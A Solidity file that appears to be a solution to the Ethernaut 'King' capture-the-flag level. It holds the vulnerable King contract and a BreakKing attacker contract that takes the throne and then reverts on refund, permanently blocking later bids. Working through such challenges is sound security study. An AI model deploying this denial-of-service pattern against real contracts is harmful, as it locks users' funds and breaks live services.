// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

contract King {
    address king;
    uint256 public prize;
    address public owner;

    constructor() payable {
        owner = msg.sender;
        king = msg.sender;
        prize = msg.value;
    }

    receive() external payable {
        require(msg.value >= prize || msg.sender == owner);
        payable(king).transfer(msg.value);
        king = msg.sender;
        prize = msg.value;
    }

    function _king() public view returns (address) {
        return king;
    }
}

contract BreakKing {
    address kingAddr;

    constructor(address _kingAddr) {
        kingAddr = _kingAddr;
    }

    receive() external payable {
        (bool success, ) = payable(kingAddr).call{value: msg.value, gas: 100000}("");
        require(success, "Transfer failed");
    }
}
